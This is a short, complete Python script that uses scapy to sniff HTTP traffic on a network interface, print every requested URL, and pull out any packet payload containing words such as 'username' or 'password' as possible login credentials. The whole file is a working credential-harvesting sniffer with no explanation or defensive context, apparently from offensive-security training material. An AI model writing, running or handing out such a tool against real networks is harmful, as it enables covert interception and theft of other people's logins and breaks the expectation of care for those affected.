#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import urllib.parse


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        load = load.decode("latin-1")
        keywords = ["username", "user", "login", "usr", "name", "usrnm", "password", "pass", "psswrd"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode())
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) # , filter = "x" can filter anything "udp, "tcp", "port 21", ...


sniff("eth0")